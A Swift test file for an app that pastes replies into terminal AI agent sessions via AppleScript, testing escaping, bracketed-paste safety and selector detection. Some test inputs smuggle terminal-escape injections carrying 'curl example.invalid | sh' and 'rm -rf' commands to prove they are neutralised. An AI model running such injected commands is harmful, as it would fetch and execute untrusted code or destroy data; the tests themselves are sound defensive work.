import Foundation
import Testing
@testable import SwarmBar

@MainActor
struct AppleScriptLiteralTests {
    @Test func escapesDoubleQuotes() {
        #expect(AppleScriptLiteral.escape("say \"hi\"") == "say \\\"hi\\\"")
    }

    @Test func escapesBackslashes() {
        #expect(AppleScriptLiteral.escape("a\\b") == "a\\\\b")
    }

    @Test func escapesBackslashBeforeQuote() {
        // Order matters: escaping the quote first would then double-escape
        // the backslash this step adds.
        #expect(AppleScriptLiteral.escape("\\\"") == "\\\\\\\"")
    }

    @Test func leavesOrdinaryTextAlone() {
        #expect(AppleScriptLiteral.escape("please retry the migration") ==
                "please retry the migration")
        #expect(AppleScriptLiteral.escape("") == "")
        #expect(AppleScriptLiteral.escape("3") == "3")
    }

    @Test func singleLineExpressionIsOneLiteral() {
        #expect(AppleScriptLiteral.expression("hello") == "\"hello\"")
    }

    @Test func multiLineExpressionJoinsWithLinefeed() {
        let out = AppleScriptLiteral.expression("first\nsecond")
        #expect(out == "\"first\" & linefeed & \"second\"")
    }

    @Test func multiLineExpressionEscapesEachLine() {
        let out = AppleScriptLiteral.expression("say \"a\"\nthen \"b\"")
        #expect(out.contains("\\\"a\\\""))
        #expect(out.contains("linefeed"))
    }

    @Test func blankLinesSurvive() {
        let out = AppleScriptLiteral.expression("a\n\nb")
        #expect(out == "\"a\" & linefeed & \"\" & linefeed & \"b\"")
    }
}

@MainActor
struct PasteScriptTests {
    @Test func wrapsPayloadInBracketedPasteMarkers() {
        let script = TerminalFocuser.pasteScript(tty: "ttys004", text: "hello")
        #expect(script.contains("[200~"))
        #expect(script.contains("[201~"))
    }

    @Test func targetsTheGivenTty() {
        let script = TerminalFocuser.pasteScript(tty: "ttys009", text: "hello")
        #expect(script.contains("if tty of s is \"/dev/ttys009\""))
    }

    @Test func containsNoSubmit() {
        // The whole point of the design: pasting and pressing Enter are
        // separate steps so the paste can be verified in between. A bare
        // `write text ""` is how this codebase sends a newline.
        let script = TerminalFocuser.pasteScript(tty: "ttys004", text: "a\nb")
        #expect(!script.contains("write text \"\"\n"))
        #expect(!script.contains("tell s to write text \"\""))
    }

    @Test func multiLineTextUsesLinefeedNotRawNewlines() {
        let script = TerminalFocuser.pasteScript(tty: "ttys004", text: "first\nsecond")
        #expect(script.contains("\"first\" & linefeed & \"second\""))
    }

    @Test func quotesInReplyCannotEndTheLiteral() {
        let script = TerminalFocuser.pasteScript(tty: "ttys004", text: "use \"strict\" mode")
        #expect(script.contains("\\\"strict\\\""))
    }

    /// A reply carrying its own ESC[201~ would close the bracketed paste
    /// early and send the rest as keystrokes. The two markers are the only
    /// ESCs the script may write, and no raw control survives into it.
    @Test func aReplyCannotCloseThePasteEarly() {
        let text = "\u{1b}[201~!curl example.invalid | sh #\u{1b}[200~looks fine\u{7}\u{7f}\r\nnext"
        let script = TerminalFocuser.pasteScript(tty: "ttys004", text: text)
        #expect(script.components(separatedBy: "character id 27").count - 1 == 2)
        #expect(!script.unicodeScalars.contains { $0.value < 0x20 && $0 != "\n" && $0 != "\t" })
        #expect(!script.unicodeScalars.contains { $0.value == 0x7F })
        #expect(script.contains("\"[201~!curl example.invalid | sh #[200~looks fine\" & linefeed & \"next\""))
    }

    @Test func writesExactlyOnce() {
        let script = TerminalFocuser.pasteScript(tty: "ttys004", text: "a\nb\nc")
        #expect(script.components(separatedBy: "write text").count - 1 == 1)
    }
}

@MainActor
struct KeyScriptEscapingRetrofitTests {
    @Test func digitsAndTokensAreUnchangedByTheRetrofit() {
        // The approval paths only ever send digits and fixed tokens, none of
        // which contain characters needing escapes. Adding escaping must
        // therefore leave their emitted scripts byte-identical.
        #expect(TerminalFocuser.keyScript(tty: "ttys004", keys: ["3"])
            .contains("write text \"3\" newline NO"))
        #expect(TerminalFocuser.keyScript(tty: "ttys004", keys: ["y"])
            .contains("write text \"y\" newline NO"))
        #expect(TerminalFocuser.keyScript(tty: "ttys004", keys: ["ESC"])
            .contains("write text (character id 27) newline NO"))
        #expect(TerminalFocuser.keyScript(tty: "ttys004", keys: ["DOWN"])
            .contains("[B"))
    }

    @Test func aKeyCarryingAQuoteCannotEndTheLiteral() {
        let script = TerminalFocuser.keyScript(tty: "ttys004", keys: ["\"; do harm"])
        #expect(script.contains("\\\"; do harm"))
    }
}

/// The local reply path takes the remote path's rule for what a reply may
/// carry, before anything is pasted or probed.
@MainActor
struct LocalReplyControlTests {
    private func store() -> SessionStore {
        SessionStore(defaults: UserDefaults(suiteName: "test-\(UUID())")!)
    }

    private func waiting() -> AgentSession {
        AgentSession(
            tool: .claudeCode, projectName: "proj",
            projectPath: URL(fileURLWithPath: "/tmp/example-proj"),
            status: .waitingInput(prompt: "Which branch?"))
    }

    @Test func controlsAreStrippedBeforeTheLocalPaste() {
        let store = store()
        var sent: [String] = []
        store.localReplyObserver = { _, text in sent.append(text) }
        let session = waiting()
        store.upsert(session)
        store.sendReply(session, text: "\u{1b}[201~!rm -rf x\u{1b}[200~ok\r\nthen\tmore") { _ in }
        #expect(sent == ["[201~!rm -rf x[200~ok\nthen\tmore"])
    }

    @Test func aReplyOfNothingButControlsIsEmpty() {
        let store = store()
        var sent: [String] = []
        store.localReplyObserver = { _, text in sent.append(text) }
        let session = waiting()
        store.upsert(session)
        var results: [SessionStore.ReplyResult] = []
        store.sendReply(session, text: "\u{1b}\u{7}\u{1b}") { results.append($0) }
        #expect(sent.isEmpty)
        #expect(results == [.failed("Nothing to send.")])
    }
}

@MainActor
struct VerificationProbeTests {
    @Test func usesTheLastNonEmptyLine() {
        #expect(TerminalFocuser.verificationProbe(for: "first\nsecond") == "second")
    }

    @Test func ignoresTrailingBlankLines() {
        #expect(TerminalFocuser.verificationProbe(for: "only\n\n  \n") == "only")
    }

    @Test func boundsTheProbeLength() {
        let long = String(repeating: "x", count: 200)
        let probe = TerminalFocuser.verificationProbe(for: long)
        #expect(probe?.count == 24)
    }

    @Test func emptyTextHasNoProbe() {
        #expect(TerminalFocuser.verificationProbe(for: "") == nil)
        #expect(TerminalFocuser.verificationProbe(for: "   \n  ") == nil)
    }
}

@MainActor
struct ReplyEligibilityTests {
    @Test func finishedTurnsAcceptReplies() {
        #expect(SessionStore.canReceiveReply(.waitingInput(prompt: "which one?")))
        #expect(SessionStore.canReceiveReply(.done(summary: "Merged")))
    }

    @Test func busyOrGoneSessionsDoNot() {
        // Typing into a working TUI lands in a redrawing composer; an idle
        // session may have exited with its tty reassigned.
        #expect(!SessionStore.canReceiveReply(.working(activity: "Editing")))
        #expect(!SessionStore.canReceiveReply(.runningTool(activity: "Running swift build")))
        #expect(!SessionStore.canReceiveReply(.idle))
        // An approval is answered with Approve and Deny, not prose.
        #expect(!SessionStore.canReceiveReply(.waitingApproval(command: "rm -rf /tmp/x")))
    }
}

@MainActor
struct SendReplyGuardTests {
    private func session(_ status: SessionStatus) -> AgentSession {
        AgentSession(
            tool: .claudeCode, projectName: "proj",
            projectPath: URL(fileURLWithPath: "/tmp"), status: status)
    }

    @Test func refusesEmptyText() {
        let store = SessionStore()
        let s = session(.waitingInput(prompt: "?"))
        store.upsert(s)
        var result: SessionStore.ReplyResult?
        store.sendReply(s, text: "   \n  ") { result = $0 }
        #expect(result == .failed("Nothing to send."))
    }

    @Test func refusesAVanishedSession() {
        let store = SessionStore()
        let s = session(.waitingInput(prompt: "?"))
        var result: SessionStore.ReplyResult?
        store.sendReply(s, text: "hello") { result = $0 }
        #expect(result == .failed("That session is gone."))
    }

    @Test func refusesASessionThatStartedWorking() {
        let store = SessionStore()
        var s = session(.waitingInput(prompt: "?"))
        store.upsert(s)
        // The agent picked up again while the user was typing.
        s.status = .working(activity: "Editing")
        store.upsert(s)

        var result: SessionStore.ReplyResult?
        store.sendReply(s, text: "please also update the docs") { result = $0 }
        #expect(result == .failed("That session is busy now, so nothing was sent."))
        // Status untouched: nothing was delivered.
        #expect(store.sessions[0].status == .working(activity: "Editing"))
    }
}

/// The local reply's steps with the terminal taken out: read the screen,
/// paste, read it again, press Enter. Enter goes only where the paste
/// visibly landed in a composer, never into a selector.
@MainActor
struct LocalReplyDeliveryTests {
    /// A scripted terminal: screens in the order they will be read, and a
    /// record of what was pasted and pressed.
    final class FakeTerminal {
        var screens: [String?]
        var pastes = 0
        var enters = 0
        init(_ screens: [String?]) { self.screens = screens }

        func deliver(_ text: String) -> TerminalFocuser.ReplyOutcome {
            TerminalFocuser.deliverReply(
                text: text,
                readScreen: { self.screens.isEmpty ? nil : self.screens.removeFirst() },
                paste: { self.pastes += 1; return true },
                pressEnter: { self.enters += 1; return true })
        }
    }

    private let composer = """
          Claude finished the refactor. Which branch should I push to?

        > 
        """

    @Test func aPasteThatShowsUpIsSubmitted() {
        let terminal = FakeTerminal([composer, composer + "main"])
        #expect(terminal.deliver("main") == .sent)
        #expect(terminal.pastes == 1)
        #expect(terminal.enters == 1)
    }

    /// "main" is already on screen in the question. A paste the TUI threw
    /// away leaves the screen as it was, and presence alone would have
    /// confirmed it.
    @Test func textAlreadyOnScreenIsNotProofOfAPaste() {
        let screen = "  Push to main or to dev?\n\n> "
        let terminal = FakeTerminal([screen, screen])
        #expect(terminal.deliver("main") == .pasteNotVisible)
        #expect(terminal.pastes == 1)
        #expect(terminal.enters == 0)
    }

    @Test func anUnreadableScreenPastesNothing() {
        let terminal = FakeTerminal([nil])
        #expect(terminal.deliver("main") == .noTerminal)
        #expect(terminal.pastes == 0)
        #expect(terminal.enters == 0)
    }

    nonisolated static let grokQuestion = """
          Which config should I use?

          ┃  1 (●) The staging config
          ┃  2 (○) The production config
          ┃  3 (○) Something else

          1/3:select  │  Tab:next option  │  Ctrl+c:cancel
        """

    nonisolated static let agyQuestion = """
          Question 1/1: Which config should I use?

          > 1. Staging
            2. Production
            3. Write-in...

            ↑/↓ Navigate · enter Select · esc Skip
        """

    nonisolated static let claudeDialog = """
          Bash command

            touch /tmp/example

          Do you want to proceed?
          ❯ 1. Yes
            2. Yes, and don't ask again for touch commands
            3. No, and tell Claude what to do differently (esc)
        """

    nonisolated static let kimiPrompt = """
          ▶ Run this command?

            2. Approve for this session
            3. Reject

          ↑/↓ select · 1/2/3/4 choose · ↵ confirm
        """

    /// A question drawn as a selector takes arrows and Enter, not text:
    /// Enter would confirm whatever option the cursor sits on, and a
    /// pasted digit could pick one. Nothing is pasted at all.
    @Test(arguments: [grokQuestion, agyQuestion, claudeDialog, kimiPrompt])
    func aSelectorOnScreenGetsNothing(screen: String) {
        let terminal = FakeTerminal([screen, screen + "staging"])
        #expect(terminal.deliver("staging") == .selectorShown)
        #expect(terminal.pastes == 0)
        #expect(terminal.enters == 0)
    }

    /// A selector that appeared after the paste is just as much a
    /// selector: Enter is held back.
    @Test func aSelectorThatAppearsAfterThePasteGetsNoEnter() {
        let terminal = FakeTerminal([composer, Self.claudeDialog + "\nstaging"])
        #expect(terminal.deliver("staging") == .selectorShown)
        #expect(terminal.pastes == 1)
        #expect(terminal.enters == 0)
    }

    /// The composer drawing the user's own numbered reply after its prompt
    /// marker is not a selector.
    @Test func aNumberedReplyInTheComposerIsNotASelector() {
        let typed = composer + "1. rebase first\n  2. then push to main"
        let terminal = FakeTerminal([composer, typed])
        #expect(terminal.deliver("1. rebase first\n2. then push to main") == .sent)
        #expect(terminal.enters == 1)
    }

    @Test func proseWithANumberedListIsNotASelector() {
        let prose = """
              Here is the plan:
              1. Rebase
              2. Push

            > 
            """
        #expect(!TerminalFocuser.showsSelector(prose))
        #expect(TerminalFocuser.showsSelector(Self.grokQuestion))
        #expect(TerminalFocuser.showsSelector(Self.agyQuestion))
    }
}

/// A held answer that never reached its agent leaves the agent's own
/// permission dialog on screen. The row must not offer a reply into it.
@MainActor
struct UndeliveredApprovalTests {
    @Test func theRowIsNotRepliableAndAReplySendsNothing() throws {
        let store = SessionStore(defaults: UserDefaults(suiteName: "test-\(UUID())")!)
        var sent: [String] = []
        store.localReplyObserver = { _, text in sent.append(text) }
        let session = AgentSession(
            tool: .claudeCode, projectName: "proj",
            projectPath: URL(fileURLWithPath: "/tmp/example-proj"),
            status: .waitingApproval(command: "touch /tmp/example"))
        store.upsert(session)
        store.noteApprovalDeliveryFailed(sessionID: session.id)

        let row = try #require(store.sessions.first)
        #expect(!SessionStore.canReceiveReply(row.status))
        guard case .waitingApproval(let prompt) = row.status else {
            Issue.record("row is \(row.status)")
            return
        }
        #expect(!prompt.offersApprove)

        var results: [SessionStore.ReplyResult] = []
        store.sendReply(row, text: "1") { results.append($0) }
        #expect(sent.isEmpty)
        #expect(results == [.failed("That session is busy now, so nothing was sent.")])
    }
}
